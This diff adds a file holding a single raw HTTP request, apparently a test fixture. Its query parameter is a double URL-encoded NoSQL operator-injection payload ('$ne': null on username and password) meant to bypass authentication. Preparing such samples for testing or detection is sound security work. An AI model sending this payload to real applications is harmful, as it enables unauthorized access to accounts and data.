@@ -1,0 +1,4 @@
+GET /a?file=%257B%2522username%2522%253A%257B%2522%2524ne%2522%253Anull%257D%252C%2522password%2522%253A%257B%2522%2524ne%2522%253Anull%257D%257D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
